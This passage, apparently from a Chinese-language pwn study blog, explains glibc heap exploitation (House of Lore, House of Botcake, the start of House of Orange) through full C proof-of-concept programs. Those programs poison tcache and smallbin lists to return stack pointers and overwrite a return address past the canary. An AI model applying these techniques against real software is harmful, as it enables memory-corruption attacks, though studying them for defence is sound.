class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">void</span>* fake_freelist[<span class="number">7</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 20.04.2 - 64bit - glibc-2.31\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating dummy chunks for using up tcache later\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *dummies[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) dummies[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake free-list on the stack\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">    fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  fake_freelist[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake free-list at %p\n&quot;</span>, fake_freelist);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;</span></span><br><span class="line">          <span class="string">&quot;introduced by smallbin-to-tcache mechanism\n&quot;</span>);</span><br><span class="line">  stack_buffer_2[<span class="number">3</span>] = (<span class="keyword">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing dummy chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(dummies[i]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now take all dummies chunk in tcache out\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> offset = (<span class="keyword">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="keyword">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="keyword">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="keyword">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，他这里是创建了一个假的fake_freelist，这个的作用就是到最后while循环时，将所有内容放入到tcache中，不然会引起崩溃</p><p><img src="/images/image-20220303160743463.png" alt="image-20220303160743463"></p><h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h2><p>在glibc2.27里的tcache是什么验证都没加</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache</span><br><span class="line">    &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以可以很轻易的double free，但是在glibc2.29之后就不一样了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)</span><br><span class="line">            malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是一样有办法可以让tcache存在我们指定地址的fake chunk，下面看poc：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实很简单，也是利用了double free不过第一次free是将a丢进了unsorted bin当中，然后第二次free将a丢进了tcache，然后利用unsorted bin当中的chunk去修改tcache中的fd指针。</p><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>这一攻击手法只是用于glibc2.27及一下，因为其中存在unsorted bin attack</p><p>其实这一攻击手法也是非常简单，主要适用于程序当中不存在free的时候形成一个unsorted bin chunk然后经过unsorted bin attack进行FSOP</p><p>因为涉及到的源码过多我这里只贴部分就行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">    || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line">        &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">    try_mmap:</span><br></pre></td></tr></table></figure><p>首先我们肯定是不想进行mmap来新增堆空间的，所以我们不能大于他的阀值(0x2000)，其次我们如果要扩展top chunk需要绕过这几条判断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 